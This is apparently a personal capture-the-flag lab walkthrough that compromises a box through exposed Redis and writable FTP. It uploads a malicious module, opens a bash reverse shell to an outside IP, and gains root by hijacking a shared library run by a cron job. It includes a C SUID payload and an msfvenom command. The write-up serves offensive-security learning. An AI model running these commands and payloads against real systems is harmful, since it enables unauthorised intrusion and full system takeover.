nmap shows ports 21,22, 80, 6379 redis
writable ftp, nothing on port 80

port 6379 -
redis, tried a couple of things from old writeups
```
redis-cli -h 10.48.176.50`
>INFO
>CONFIG GET *
>eval "dofile('whoami')" 0 --> NOT work
```
got a config file info
```txt
executable:/usr/local/bin/redis-server
config_file:/etc/redis/redis.conf
```

Tried using the rce script, but that wouldnt give us a shell

Then we look into hacktricks, and see that we can use LOAD MODULE to load a module into the memory, where we will have defined a system execute function
HINT TAKEN - people cloning https://github.com/n0b0dyCN/RedisModules-ExecuteCommand and compiling using `make` to get the .so file, whic has system.execute function
Wasnt working for me. prolly some simple hashIncludes were missing

The exp.so from [[wombo]] also has a system.exec function, we can use that

```zsh
ftp IP
cd pub
put exp.so
bye

redis-cli IP
MODULE LOAD /var/ftp/pub/exp.so
system.exec "id"
system.exec "bash -c 'bash -i >& /dev/tcp/192.168.45.156/22 0>&1'"
```

Now we can give ourselves a shell
pablo!

---
```zsh
cat /etc/crontab #shows /usr/bin/log-sweeper running every minute
file /usr/bin/log-sweeper #shows it is an elf, which uses shared files
./log-sweeper
 error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
```
So, utils.so is missing. If we're able to generate a malicious shared library util.so, make it set our uid, gid to 0, then we'll get root. But we need to drop the .so file in one of the $PATH locations, which is normally nor writable

Running linpeas shows that /usr/local/lib/dev, which is in the oath of LD_LIBRARY_PATH, just happens to be writable by us. which means, we need to drop our .so there

```C
#include <stdio.h>
#include <unistd.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {
setgid(0);
setuid(0);
system("chmod u+s /bin/bash");  
}
```
save it as utils.c
send it to victim, compile it there
`gcc -fPIC -shared -o utils.so utils.c -nostartfiles`
OR 
```
 msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```
it has to be at the /usr/local/lib/dev
once the cron hits, we can verify with `ls -l /bin/bash` and get root with bash -p
root!